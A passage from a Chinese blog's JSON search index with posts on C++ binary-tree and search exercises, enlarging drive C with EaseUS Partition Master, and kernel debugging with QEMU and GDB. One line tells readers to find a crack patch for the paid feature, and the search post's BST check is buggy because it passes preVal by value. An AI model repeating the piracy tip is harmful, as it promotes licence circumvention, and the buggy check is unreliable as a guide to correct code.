negativeNums.size()];\t\t&#125;\t&#125;&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"数据结构编程题 二叉树","url":"/2023/08/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E4%BA%8C%E5%8F%89%E6%A0%91/","content":"二叉树定义以下为本文解题代码的二叉树定义。\nstruct TreeNode &#123;\tint val;\tTreeNode* left, *right;\tTreeNode(int val = 0, TreeNode* left = nullptr, TreeNode* right = nullptr)\t\t: val(val), left(left), right(right) &#123;&#125;&#125;;\n非递归先序遍历题目描述编写先序遍历二叉树的非递归算法。\n解题代码void nonRecurPre(TreeNode* root) &#123;\tif (root == nullptr) return;\tstack&lt;TreeNode*&gt; s;\twhile (root != nullptr || !s.empty()) &#123;\t\tif (root != nullptr) &#123;\t\t\tcout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;\t\t\ts.emplace(root);\t\t\troot = root-&gt;left;\t\t&#125;\t\telse &#123;\t\t\troot = s.top();\t\t\ts.pop();\t\t\troot = root-&gt;right;\t\t&#125;\t&#125;&#125;\n非递归后序遍历题目描述编写后序遍历二叉树的非递归算法。\n解题代码void nonRecurPost(TreeNode* root) &#123;\tif (root == nullptr) return;\tstack&lt;TreeNode*&gt; s;\tTreeNode* pre = nullptr;\twhile (root != nullptr || !s.empty()) &#123;\t\twhile (root != nullptr) &#123;\t\t\ts.emplace(root);\t\t\troot = root-&gt;left;\t\t&#125;\t\troot = s.top();\t\ts.pop();\t\tif (root-&gt;right == nullptr || root-&gt;right == pre) &#123;\t\t\tcout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;\t\t\tpre = root;\t\t\troot = nullptr;\t\t&#125;\t\telse &#123;\t\t\ts.emplace(root);\t\t\troot = root-&gt;right;\t\t&#125;\t&#125;&#125;\n反向层序遍历题目描述试给出二叉树的自下而上、从右到左的层序遍历算法。\n解题代码void reOrderTraversal(TreeNode* root) &#123;\tqueue&lt;TreeNode*&gt; Q;\tstack&lt;int&gt; S;\tQ.emplace(root);\twhile (!Q.empty()) &#123;\t\tTreeNode* fNode = Q.front();\t\tS.emplace(fNode-&gt;val);\t\tQ.pop();\t\tif (fNode-&gt;left != nullptr) &#123;\t\t\tQ.emplace(fNode-&gt;left);\t\t&#125;\t\tif (fNode-&gt;right != nullptr) &#123;\t\t\tQ.emplace(fNode-&gt;right);\t\t&#125;\t&#125;\twhile (!S.empty()) &#123;\t\tcout &lt;&lt; S.top() &lt;&lt; &quot; &quot;;\t\tS.pop();\t&#125;&#125;\n非递归计算高度题目描述假设二叉树采用二叉链表存储结构，设计一个非递归算法求二叉树的高度。\n解题代码int nonRecurHeight(TreeNode* root) &#123;\tif (root == nullptr) return 0;\tint res = 0;\tqueue&lt;TreeNode*&gt; q, nq;\tq.emplace(root);\twhile (!q.empty()) &#123;\t\twhile (!q.empty()) &#123;\t\t\tTreeNode* fNode = q.front();\t\t\tq.pop();\t\t\tif (fNode-&gt;left != nullptr) &#123;\t\t\t\tnq.emplace(fNode-&gt;left);\t\t\t&#125;\t\t\tif (fNode-&gt;right != nullptr) &#123;\t\t\t\tnq.emplace(fNode-&gt;right);\t\t\t&#125;\t\t&#125;\t\tq = move(nq);\t\t++res;\t&#125;\treturn res;&#125;\n根据中序和先序序列建立二叉树题目描述设一棵二叉树各结点的值互不相同，其先序遍历序列和中序遍历序列分别存储于两个一维数组 A 和 B 中，试编写算法建立该二叉树的二叉链表。\n解题代码TreeNode* recurCreate(vector&lt;int&gt;&amp; preOrder, int l1, int r1, vector&lt;int&gt;&amp; inOrder, int l2, int r2) &#123;\tif (l1 == r1) return nullptr;\tauto preBegin = preOrder.begin() + l1, preEnd = preOrder.begin() + r1;\tauto inBegin = inOrder.begin() + l2, inEnd = inOrder.begin() + r2;\tint x = *preBegin;\tTreeNode* root = new TreeNode(x);\tauto it = find(inBegin, inEnd, x);\tint lenL = it - inBegin;\troot-&gt;left = recurCreate(preOrder, l1 + 1, l1 + lenL + 1, inOrder, l2, l2 + lenL);\troot-&gt;right = recurCreate(preOrder, l1 + lenL + 1, r1, inOrder, l2 + lenL + 1, r2);\treturn root;&#125;TreeNode* createTree(vector&lt;int&gt;&amp; preOrder, vector&lt;int&gt;&amp; inOrder) &#123;\tint l1 = 0, r1 = preOrder.size();\tint l2 = 0, r2 = inOrder.size();\treturn recurCreate(preOrder, l1, r1, inOrder, l2, r2);&#125;\n判断完全二叉树题目描述二叉树按二叉链表形式存储，试编写一个判别给定二叉树是否是完全二叉树的算法。\n解题代码bool isCompleteBT(TreeNode* root) &#123;\tqueue&lt;TreeNode*&gt; Q;\tQ.emplace(root);\tbool isLeaves = false;\twhile (!Q.empty()) &#123;\t\tTreeNode* fNode = Q.front();\t\tQ.pop();\t\tif (fNode == nullptr) &#123;\t\t\tisLeaves = true;\t\t\tcontinue;\t\t&#125;\t\tif (isLeaves) return false;\t\tQ.emplace(fNode-&gt;left);\t\tQ.emplace(fNode-&gt;right);\t&#125;\treturn true;&#125;\n计算双分支结点数题目描述假设二叉树采用二叉链表存储结构存储，试设计一个算法，计算一棵给定二叉树的所有双分支结点个数。\n解题代码int doubleNodeCnt(TreeNode* root) &#123;\tif (root == nullptr) return 0;\tif (root-&gt;left != nullptr &amp;&amp; root-&gt;right != nullptr) &#123;\t\treturn 1 + doubleNodeCnt(root-&gt;left) + doubleNodeCnt(root-&gt;right);\t&#125;\telse &#123;\t\treturn doubleNodeCnt(root-&gt;left) + doubleNodeCnt(root-&gt;right);\t&#125;&#125;\n交换左右子树题目描述设树 B 是一棵采用链式结构存储的二叉树,编写一个把树 B 中所有结点的左右子树进行交换的算法。\n解题代码void swapLRNode(TreeNode* root) &#123;\tif (root == nullptr) return;\tTreeNode* temp = root-&gt;left;\troot-&gt;left = root-&gt;right;\troot-&gt;right = temp;\tswapLRNode(root-&gt;left);\tswapLRNode(root-&gt;right);&#125;\n先序序列第k个结点值题目描述假设二叉树采用二叉链表存储结构，设计一个算法，求先序遍历序列中第 k （1 &lt;= k &lt;= 链表中结点个数）个结点的值。\n解题代码int kthNodeVal(TreeNode* root, int&amp; k) &#123;\tif (root == nullptr) return 0;\tif (--k == 0) return root-&gt;val;\treturn kthNodeVal(root-&gt;left, k) + kthNodeVal(root-&gt;right, k);&#125;\n删除特定值的结点的子树题目描述已知二叉树以二叉链表形式存储，编写算法完成：对于树中的每个元素值为 x 的结点，删除以它为根的子树，并释放相应的空间。\n解题代码void freeMemory(TreeNode* root) &#123;\tif (root == nullptr) return;\tfreeMemory(root-&gt;left);\tfreeMemory(root-&gt;right);\tdelete root;&#125;void deleteXNode(TreeNode* root, int x) &#123;\tif (root == nullptr) return;\telse if (root-&gt;val == x) &#123;\t\tfreeMemory(root);\t\treturn;\t&#125;\tif (root-&gt;left != nullptr &amp;&amp; root-&gt;left-&gt;val == x) &#123;\t\tfreeMemory(root-&gt;left);\t\troot-&gt;left = nullptr;\t&#125;\tif (root-&gt;right != nullptr &amp;&amp; root-&gt;right-&gt;val == x) &#123;\t\tfreeMemory(root-&gt;right);\t\troot-&gt;right = nullptr;\t&#125;\tdeleteXNode(root-&gt;left, x);\tdeleteXNode(root-&gt;right, x);&#125;\n值为x的结点的祖先题目描述在二叉树中查找值为 x 的结点，试编写算法打印值为 x 的结点的所有祖先，假设值为 x 的结点的不多于一个。\n解题代码bool ancestorOfXNode(TreeNode* root, int x) &#123;\tif (root == nullptr) return false;\tif (root-&gt;val == x) return true;\tbool left = ancestorOfXNode(root-&gt;left, x);\tbool right = ancestorOfXNode(root-&gt;right, x);\tif (left || right) &#123;\t\tcout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;\t&#125;\treturn left || right;&#125;\n两结点的最近公共祖先题目描述设 p 和 q 为指向二叉树中任意两个结点的指针，试编写算法找到 p 和 q 的最近公共祖先结点 r.\n解题代码TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123;\tif (root == nullptr || root == p || root == q) return root;\tTreeNode* left = lowestCommonAncestor(root-&gt;left, p, q);\tTreeNode* right = lowestCommonAncestor(root-&gt;right, p, q);\tif (left != nullptr &amp;&amp; right != nullptr) &#123;\t\treturn root;\t&#125;\telse if (left != nullptr) &#123;\t\treturn left;\t&#125;\telse &#123;\t\treturn right;\t&#125;&#125;\n二叉树的宽度题目描述假设二叉树采用二叉链表存储结构，设计一个算法，求非空二叉树 b 的宽度（即具有结点数最多的那一层的结点个数）。\n解题代码int widthOfBT(TreeNode* root) &#123;\tif (root == nullptr) return 0;\tsize_t res = 1;\tqueue&lt;TreeNode*&gt; q, nq;\tq.emplace(root);\twhile (!q.empty()) &#123;\t\twhile (!q.empty()) &#123;\t\t\tTreeNode* fNode = q.front();\t\t\tq.pop();\t\t\tif (fNode-&gt;left != nullptr) &#123;\t\t\t\tnq.emplace(fNode-&gt;left);\t\t\t&#125;\t\t\tif (fNode-&gt;right != nullptr) &#123;\t\t\t\tnq.emplace(fNode-&gt;right);\t\t\t&#125;\t\t&#125;\t\tq = move(nq);\t\tres = max(res, q.size());\t&#125;\treturn res;&#125;\n满二叉树的后序序列题目描述设有一棵满二叉树（所有结点值均不同），已知其先序序列为 pre，设计一个算法求其后序序列 post.\n解题代码void getPost(vector&lt;int&gt;&amp; preOrder, int p1, int q1, vector&lt;int&gt;&amp; postOrder, int p2, int q2) &#123;\tif (p1 &gt; q1) return;\tpostOrder[q2] = preOrder[p1];\tint mid = (q1 - p1) / 2;\tgetPost(preOrder, p1 + 1, p1 + mid, postOrder, p2, p2 + mid - 1);\tgetPost(preOrder, p1 + mid + 1, q1, postOrder, p2 + mid, q2 - 1);&#125;vector&lt;int&gt; postOfFBT(vector&lt;int&gt;&amp; preOrder) &#123;\tint n = preOrder.size();\tvector&lt;int&gt; res(n);\tgetPost(preOrder, 0, n - 1, res, 0, n - 1);\treturn res;&#125;\n将叶结点连接为单链表题目描述设计一个算法将二叉树的叶结点按从左到右的顺序连成一个单链表，表头指针为 head，二叉树按照二叉链表形式存储。\n解题代码ListNode* linkingLeaves(TreeNode* root) &#123;\tqueue&lt;TreeNode*&gt; q;\tq.emplace(root);\tListNode* dummy = new ListNode(-1);\tListNode* curNode = dummy;\twhile (!q.empty()) &#123;\t\tTreeNode* fNode = q.front();\t\tq.pop();\t\tif (fNode-&gt;left == nullptr &amp;&amp; fNode-&gt;right == nullptr) &#123;\t\t\tcurNode-&gt;next = new ListNode(fNode-&gt;val);\t\t\tcurNode = curNode-&gt;next;\t\t&#125;\t\tif (fNode-&gt;left != nullptr) &#123;\t\t\tq.emplace(fNode-&gt;left);\t\t&#125;\t\tif (fNode-&gt;right != nullptr) &#123;\t\t\tq.emplace(fNode-&gt;right);\t\t&#125;\t&#125;\treturn dummy-&gt;next;&#125;\n相似二叉树题目描述试设计判断两棵二叉树是否相似的算法。所谓二叉树 T1 和 T2 相似，指的是 T1 和 T2 都是空的二叉树或都只有一个根节点；或者 T1 的左子树和 T2 的左子树是相似的，且 T1 的右子树和 T2 的右子树是相似的。\n解题代码bool similarBT(TreeNode* root1, TreeNode * root2) &#123;\tif (root1 == nullptr &amp;&amp; root2 == nullptr) return true;\tif ((root1 == nullptr) ^ (root2 == nullptr)) return false;\tif (root1-&gt;left == nullptr &amp;&amp; root1-&gt;right == nullptr \t\t&amp;&amp; root2-&gt;left == nullptr &amp;&amp; root2-&gt;right == nullptr) &#123;\t\treturn true;\t&#125;\treturn similarBT(root1-&gt;left, root2-&gt;left) &amp;&amp; similarBT(root1-&gt;right, root2-&gt;right);&#125;\n二叉树的带权路径长度和题目描述二叉树的带权路径长度（WPL）是二叉树中所有叶结点的带权路径长度之和，给定一棵二叉树，其叶结点的 val 域保存该结点的非负权值。设 root 为指向 T 的根节点的指针，设计求 T 的 WPL 的算法。\n解题代码BFSint getWPL(TreeNode* root) &#123;\tqueue&lt;TreeNode*&gt; q, nq;\tq.emplace(root);\tint res = 0;\tfor (int len = 0; !q.empty(); ++len) &#123;\t\twhile (!q.empty()) &#123;\t\t\tTreeNode* fNode = q.front();\t\t\tq.pop();\t\t\tif (fNode-&gt;left == nullptr &amp;&amp; fNode-&gt;right == nullptr) &#123;\t\t\t\tres += fNode-&gt;val * len;\t\t\t&#125;\t\t\tif (fNode-&gt;left != nullptr) &#123;\t\t\t\tnq.emplace(fNode-&gt;left);\t\t\t&#125;\t\t\tif (fNode-&gt;right != nullptr) &#123;\t\t\t\tnq.emplace(fNode-&gt;right);\t\t\t&#125;\t\t&#125;\t\tq = move(nq);\t&#125;\treturn res;&#125;\nDFSint dfs(TreeNode* root, int depth) &#123;\tif (root == nullptr) return 0;\tif (root-&gt;left == nullptr &amp;&amp; root-&gt;right == nullptr) &#123;\t\treturn root-&gt;val * depth;\t&#125;\treturn dfs(root-&gt;left, depth + 1) + dfs(root-&gt;right, depth + 1);&#125;int getWPL(TreeNode* root) &#123;\treturn dfs(root, 0);&#125;\n表达式树转表达式题目描述请设计一个算法，将给定表达式树转换为对应的中缀表达式并输出。\n解题代码void dfs(TreeNode&lt;char&gt;* root, int depth) &#123;\tif (root == nullptr) return;\tif (root-&gt;left == nullptr &amp;&amp; root-&gt;right == nullptr) &#123;\t\tcout &lt;&lt; root-&gt;val;\t&#125;\telse &#123;\t\tif (depth &gt; 1) cout &lt;&lt; &quot;(&quot;;\t\tdfs(root-&gt;left, depth + 1);\t\tcout &lt;&lt; root-&gt;val;\t\tdfs(root-&gt;right, depth + 1);\t\tif (depth &gt; 1) cout &lt;&lt; &quot;)&quot;;\t&#125;&#125;void getInfixExp(TreeNode&lt;char&gt;* root) &#123;\tdfs(root, 1);&#125;\n判定顺序存储二叉树是否为二叉搜索树题目描述已知非空二叉树 T 结点值均为正整数，采用顺序存储方式存储，T 中不存在的结点在数组中用 -1 表示。请设计一个尽可能高效的算法，判定一棵采用这种方式存储的二叉树是否为二叉搜索树。\n解题代码bool dfs(vector&lt;int&gt;&amp; T, int idx, int&amp; lastVal) &#123;\tif (idx - 1 &gt;= T.size() || T[idx - 1] == -1) return true;\tif (!dfs(T, idx * 2, lastVal) || T[idx - 1] &lt;= lastVal) return false;\tlastVal = T[idx - 1];\treturn dfs(T, idx * 2 + 1, lastVal);&#125;bool isBST(vector&lt;int&gt;&amp; T) &#123;\tint lastVal = INT32_MIN;\treturn dfs(T, 1, lastVal);&#125;\n根据层序序列建立二叉树题目描述设一棵二叉树层序遍历序列存储于一个一维数组中，空结点用 INT32_MAX 表示，试编写算法建立该二叉树的二叉链表。\n解题代码TreeNode* createTreeByOrder(vector&lt;int&gt;&amp; order) &#123;    if (order.front() == INT32_MAX) return nullptr;    queue&lt;TreeNode*&gt; q;    int idx = 0;    TreeNode* root = new TreeNode(order[idx++]);    q.emplace(root);    while (!q.empty()) &#123;        TreeNode* fNode = q.front();        q.pop();        if (fNode == nullptr) continue;        if (idx &lt; order.size()) &#123;            TreeNode* lChild = nullptr;            if (order[idx] != INT32_MAX) &#123;                lChild = new TreeNode(order[idx]);            &#125;            fNode-&gt;left = lChild;            q.emplace(lChild);            ++idx;        &#125;        if (idx &lt; order.size()) &#123;            TreeNode* rChild = nullptr;            if (order[idx] != INT32_MAX) &#123;                rChild = new TreeNode(order[idx]);            &#125;            fNode-&gt;right = rChild;            q.emplace(rChild);            ++idx;        &#125;    &#125;    return root;&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"将D盘空间划分给C盘","url":"/2025/02/03/%E5%B0%86D%E7%9B%98%E7%A9%BA%E9%97%B4%E5%88%92%E5%88%86%E7%BB%99C%E7%9B%98/","content":"前段时间换了刚刚换了新的机械革命的笔记本，发现拿到手时磁盘已经预先分好了区，但是 C 盘（系统盘）只分了 200 GB。在装了 WSL 等一些必备的环境后，就只剩下不到 100 GB，感觉很没有安全感（😩），于是就想办法给 C 盘划分更多的空间，以下是一些经验分享。\n\n尝试使用系统自带工具首先，我尝试着使用 Windows 自带的磁盘管理工具（Windows 11 下右键底部的“开始”键）。\n开始的设想是：首先对 D 盘进行“压缩卷”将一部分空闲的存储空间转为“未分配”状态，然后对 C 盘执行”扩展卷“将刚腾出来的”未分配“空间给合并。但是发现 C 盘的”扩展卷“选项是灰色的，不可选。查阅资料得知一个磁盘在进行扩展卷时只能合并与之相邻的磁盘分区，而”压缩卷“腾出的空闲空间是位于磁盘右侧的，该空间无法与 C 盘进行合并，只能重新合入 D 盘中。\n\n借助第三方工具要想使得 C 盘能够合并 D 盘的空闲空间，就必须使得 D 盘划分出的空闲空间位于 D 盘的左侧，而这必然涉及到磁盘数据的移动，存在数据丢失的风险，Windows 也并没有提供这样的功能。\n于是转而寻求第三方工具的帮助，最终发现了一个强大的磁盘处理软件——EaseUS Partition Master。该软件包括很多高级的磁盘处理功能，其中就包括“左右自由划分磁盘分区”。\n\n可以在 D 盘左侧划分出一片空闲空间，随后 C 盘便可以将其合并了。\n\n 注意，该软件的此功能为收费功能，若不想为之付费，可自行寻找破解补丁。\n\n最终，C 盘成功被扩展。\n\n","categories":["经验"],"tags":["经验","Windows11","磁盘管理"]},{"title":"使用QEMU调试Linux内核","url":"/2025/11/11/%E4%BD%BF%E7%94%A8QEMU%E8%B0%83%E8%AF%95Linux%E5%86%85%E6%A0%B8/","content":"本文是一个快速记录，旨在记录使用 QEMU 调试 Linux 内核的方法，文章内容比较短，内容也比较浅显，不会对具体原理进行分析，主打一个够用。使用的 QEMU 版本为 6.2，Linux 内核版本为 5.10，指令集架构为 x86_64。\n\n使用 monitor使用 monitor 的前提是要先启用该功能，一般将其设置在指定的 telnet 端口（如 6789）：\n-monitor telnet:localhost:6789,server,nowait,nodelay\n使用 monitor 调试的基本场景是内核 crash 时，打开 QEMU 的 monitor，打印此时的寄存器值。为了保证 RIP 的值准确，需要在 QEMU 模拟器的内核命令行参数中关闭内核地址空间随机化：\n-append &quot;nokaslr&quot;\n打开新的终端使用 telnet 连接到指定端口：\n$ telnet localhost 6789Trying 127.0.0.1...Connected to localhost.Escape character is &#x27;^]&#x27;.QEMU 6.2.0 monitor - type &#x27;help&#x27; for more information(qemu) info registersRAX=0000000000000839 RBX=00000000000a328c RCX=0000000000000000 RDX=0000000000001000RSI=0000000000000086 RDI=0000000000001001 RBP=ffffffff82403f40 RSP=ffffffff82403ec8R8 =ffffffff82450f20 R9 =2d2d2d5d2063696e R10=20796c6c61756e61 R11=6572656767697274R12=0000000000000000 R13=00000000000a32f0 R14=0000000000000047 R15=0000000000000000RIP=ffffffff8142b090 RFL=00000202 [-------] CPL=0 II=0 A20=1 SMM=0 HLT=0ES =0000 0000000000000000 00000000 00000000CS =0010 0000000000000000 ffffffff 00af9b00 DPL=0 CS64 [-RA]SS =0000 0000000000000000 ffffffff 00c09300 DPL=0 DS   [-WA]DS =0000 0000000000000000 00000000 00000000FS =0000 0000000000000000 00000000 00000000GS =0000 ffffffff82b01000 00000000 00000000LDT=0000 0000000000000000 00000000 00008200 DPL=0 LDTTR =0020 0000000000000000 00000fff 00808900 DPL=0 TSS64-avlGDT=     ffffffff82b0c000 0000007fIDT=     ffffffff82c38000 00000fffCR0=80050033 CR2=ffff888000013750 CR3=0000000002b82000 CR4=000000a0DR0=0000000000000000 DR1=0000000000000000 DR2=0000000000000000 DR3=0000000000000000DR6=00000000ffff0ff0 DR7=0000000000000400EFER=0000000000000d01FCW=037f FSW=0000 [ST=0] FTW=00 MXCSR=00001f80FPR0=0000000000000000 0000 FPR1=0000000000000000 0000FPR2=0000000000000000 0000 FPR3=0000000000000000 0000FPR4=0000000000000000 0000 FPR5=0000000000000000 0000FPR6=0000000000000000 0000 FPR7=0000000000000000 0000XMM00=0000000000000000 0000000000000000 XMM01=0000000000000000 0000000000000000XMM02=0000000000000000 0000000000000000 XMM03=0000000000000000 0000000000000000XMM04=0000000000000000 0000000000000000 XMM05=0000000000000000 0000000000000000XMM06=0000000000000000 0000000000000000 XMM07=0000000000000000 0000000000000000XMM08=0000000000000000 0000000000000000 XMM09=0000000000000000 0000000000000000XMM10=0000000000000000 0000000000000000 XMM11=0000000000000000 0000000000000000XMM12=0000000000000000 0000000000000000 XMM13=0000000000000000 0000000000000000XMM14=0000000000000000 0000000000000000 XMM15=0000000000000000 0000000000000000\n可以看到，此时的 pc（x86_64 架构下为 RIP 寄存器） 停在 0xffffffff8142b090 的位置，此时我们可以对内核进行反汇编并查看此时的代码上下文，注意，需要对 vmlinux 进行 dump 而不是对 bzImage：\nobjdump -d vmlinux &gt; kernel.asm\n然后搜索 RIP 值所在的指令位置：\nffffffff8142b090 &lt;delay_loop&gt;:ffffffff8142b090:   48 89 f8                mov    %rdi,%raxffffffff8142b093:   48 85 c0                test   %rax,%raxffffffff8142b096:   74 1d                   je     ffffffff8142b0b5 &lt;delay_loop+0x25&gt;ffffffff8142b098:   eb 06                   jmp    ffffffff8142b0a0 &lt;delay_loop+0x10&gt;ffffffff8142b09a:   66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)ffffffff8142b0a0:   eb 0e                   jmp    ffffffff8142b0b0 &lt;delay_loop+0x20&gt;ffffffff8142b0a2:   66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)ffffffff8142b0a9:   00 00 00 00ffffffff8142b0ad:   0f 1f 00                nopl   (%rax)ffffffff8142b0b0:   48 ff c8                dec    %raxffffffff8142b0b3:   75 fb                   jne    ffffffff8142b0b0 &lt;delay_loop+0x20&gt;ffffffff8142b0b5:   48 ff c8                dec    %raxffffffff8142b0b8:   c3                      retffffffff8142b0b9:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)\n使用 GDBQEMU 实现了 GDB-stub，因此能够支持使用 GDB 通过远程连接的方式调试模拟器内运行的内核。\n为了方便调试的进行，需要在编译内核时开启调试信息：\n$ make menuconfig# 确保设置：Kernel hacking#\t\t\t-&gt; Compile-time checks and compiler options#\t\t\t\t-&gt;  # [*] Compile the kernel with debug info\n在启动 QEMU 时，参数加上 -s -S，这样模拟器将会在执行时停止在第一条指令处，并开放默认端口 1234 等待 GDB client 连接。\n同样，打开一个新的终端，使用 gdb vmlinux 启动 GDB 并加载内核的符号，并使用 target remote 连接到指定的 GDB 服务端，此后便可以像正常 GDB 一样进行调试了。\n$ gdb vmlinuxGNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-gitCopyright (C) 2024 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type &quot;show copying&quot; and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;https://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from vmlinux...(gdb) target remote localhost:1234Remote debugging using localhost:12340x000000000000fff0 in exception_stacks ()(gdb) b start_kernelBreakpoint 1 at 0xffffffff82b2c921: file init/main.c, line 853.(gdb) cContinuing.Breakpoint 1, start_kernel () at init/main.c:853853             set_task_stack_end_magic(&amp;init_task);(gdb)\n","categories":["操作系统"],"tags":["操作系统","经验","Linux"]},{"title":"数据结构编程题 查找","url":"/2023/08/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E6%9F%A5%E6%89%BE/","content":"二叉树定义以下为本文解题代码的二叉树定义。\nstruct TreeNode &#123;\tint val;\tTreeNode* left, *right;\tTreeNode(int val = 0, TreeNode* left = nullptr, TreeNode* right = nullptr)\t\t: val(val), left(left), right(right) &#123;&#125;&#125;;\n递归二分查找题目描述写出二分查找的递归算法。初始调用时，left 为1，right 为 n.\n解题代码bool recurBS(vector&lt;int&gt;&amp; nums, int target, int left, int right) &#123;\tif (left &gt; right) return false;\tint mid = (left + right) / 2;\tif (nums[mid] == target) return true;\telse if (nums[mid] &gt; target) &#123;\t\treturn recurBS(nums, target, left, mid - 1);\t&#125;\telse &#123;\t\treturn recurBS(nums, target, mid + 1, right);\t&#125;&#125;\n优化顺序查找题目描述线性表中各结点的检索概率不等时，可用如下策略提高顺序检索的效率：若找到指定的结点，则将该结点和其前驱节点（若存在）交换，使得经常被检索的结点尽量位于表的前端。试设计在顺序结构和链式结构的线性表上实现上述策略的顺序检索算法。\n解题代码顺序表bool optimisedSS(vector&lt;int&gt;&amp; nums, int target) &#123;\tfor (int i = 0; i &lt; nums.size(); ++i) &#123;\t\tif (nums[i] == target) &#123;\t\t\tif (i &gt; 0) &#123;\t\t\t\tswap(nums[i - 1], nums[i]);\t\t\t&#125;\t\t\treturn true;\t\t&#125;\t&#125;\treturn false;&#125;\n链表bool optimisedSS(ListNode* head, int target) &#123;\tif (head == nullptr) return false;\tListNode* dummy = new ListNode(-1, head); // 哨兵结点\tif (dummy-&gt;next-&gt;val == target) return true;\twhile (dummy-&gt;next-&gt;next != nullptr) &#123;\t\tif (dummy-&gt;next-&gt;next-&gt;val == target) &#123;\t\t\tListNode* pre = dummy;\t\t\tListNode* node1 = dummy-&gt;next;\t\t\tListNode* node2 = dummy-&gt;next-&gt;next;\t\t\tpre-&gt;next = node2;\t\t\tnode1-&gt;next = node2-&gt;next;\t\t\tnode2-&gt;next = node1;\t\t\treturn true;\t\t&#125;\t\tdummy = dummy-&gt;next;\t&#125;\treturn false;&#125;\n判定二叉搜索树题目描述试编写一个算法，判断给定的二叉树是否是二叉搜索树。\n解题代码bool dfs(TreeNode* root, int preVal) &#123;\tif (root == nullptr) return true;\tif (!dfs(root-&gt;left, preVal) || root-&gt;val &lt;= preVal) &#123;\t\treturn false;\t&#125;\tpreVal = root-&gt;val;\treturn dfs(root-&gt;right, preVal);&#125;bool isBST(TreeNode* root) &#123;\tint lastVal = INT32_MIN;\treturn dfs(root, lastVal);&#125;\n计算某结点层次题目描述设计一个算法，求出指定结点在给定二叉排序树中的层次。\n解题代码int dfs(TreeNode* root, TreeNode* node, int depth) &#123;\tif (root == nullptr) return 0;\tif (root-&gt;val == node-&gt;val) &#123;\t\treturn depth;\t&#125;\telse if (root-&gt;val &lt; node-&gt;val) &#123;\t\treturn dfs(root-&gt;right, node, depth + 1);\t&#125;\telse &#123;\t\treturn dfs(root-&gt;left, node, depth + 1);\t&#125;&#125;int calNodeDepth(TreeNode* root, TreeNode* node) &#123;\treturn dfs(root, node, 1);&#125;\n判定平衡二叉树题目描述利用二叉树遍历的遍历的思想，编写一个判断二叉树是否是平衡二叉树的算法。\n解题代码O(n^2)int calDepth(TreeNode* root) &#123;\tif (root == nullptr) return 0;\treturn 1 + max(calDepth(root-&gt;left), calDepth(root-&gt;right));&#125;bool isBalanced(TreeNode* root) &#123;\tif (root == nullptr) return true;\tint lDepth = calDepth(root-&gt;left);\tint rDepth = calDepth(root-&gt;right);\treturn abs(lDepth - rDepth) &lt;= 1 &amp;&amp; isBalanced(root-&gt;left) &amp;&amp; isBalanced(root-&gt;right);&#125;\n在每次递归判断左右子树是否平衡时，需要重新计算其高度，因此引入了大量不必要的计算。而如果某棵树的子树之一已经是非平衡树，那么这棵树一定是非平衡树，根据该性质，可将对平衡的判断改为自底向上进行。以下为自底向上判断平衡的方式，可将时间复杂度优化至 O(n).\nO(n)int calDepth(TreeNode* root) &#123;\tif (root == nullptr) return 0;\tint lDepth = calDepth(root-&gt;left);\tint rDepth = calDepth(root-&gt;right);\tif (lDepth == -1 || rDepth == -1 || abs(lDepth - rDepth) &gt;= 2) &#123;\t\treturn -1;\t&#125;\treturn 1 + max(lDepth, rDepth);&#125;bool isBalanced(TreeNode* root) &#123;\treturn calDepth(root) &gt;= 0;&#125;\n二叉搜索树最大和最小结点题目描述设计一个算法，求出给定二叉搜索树中最小和最大的关键字。\n解题代码int calMaxVal(TreeNode* root) &#123;\tif (root-&gt;right == nullptr) return root-&gt;val;\treturn calMaxVal(root-&gt;right);&#125;int calMinVal(TreeNode* root) &#123;\tif (root-&gt;left == nullptr) return root-&gt;val;\treturn calMinVal(root-&gt;left);&#125;pair&lt;int, int&gt; calMaxMin(TreeNode* root) &#123;\tint minVal = root-&gt;left == nullptr ? root-&gt;val : calMinVal(root-&gt;left);\tint maxVal = root-&gt;right == nullptr ? root-&gt;val : calMaxVal(root-&gt;right);\treturn make_pair(minVal, maxVal);&#125;\n二叉搜索树值不小于 k 的元素题目描述设计一个算法，从大到小输出二叉搜索树中所有值不小于 k 的元素。\n解题代码void printNotSmallerK(TreeNode* root, int k) &#123;\tif (root == nullptr) return;\tprintNotSmallerK(root-&gt;right, k);\tif (root-&gt;val &gt;= k) &#123;\t\tcout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;\t&#125;\telse return;\tprintNotSmallerK(root-&gt;left, k);&#125;\n查找第k小的元素题目描述编写一个递归算法，在一棵有 n 个结点的，随机建立起来的二叉搜索树上查找第 k （1 &lt;= k &lt;= n）小的元素，并返回指向该结点的指针，要求算法的平均时间复杂度为 O(logn)。二叉搜索树中的每个结点除 data, lchild, rchild 等数据成员外，增加一个 count 成员，保存以该结点为根的子树上的结点个数。\n解题代码TreeNode* findKthNode(TreeNode* root, int&amp; k) &#123;\tif (root == nullptr) return nullptr;\tTreeNode* left = findKthNode(root-&gt;left, k);\tif (left != nullptr) return left;\tif (--k == 0) return root;\treturn findKthNode(root-&gt;right, k);&#125;","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"数据结构编程题 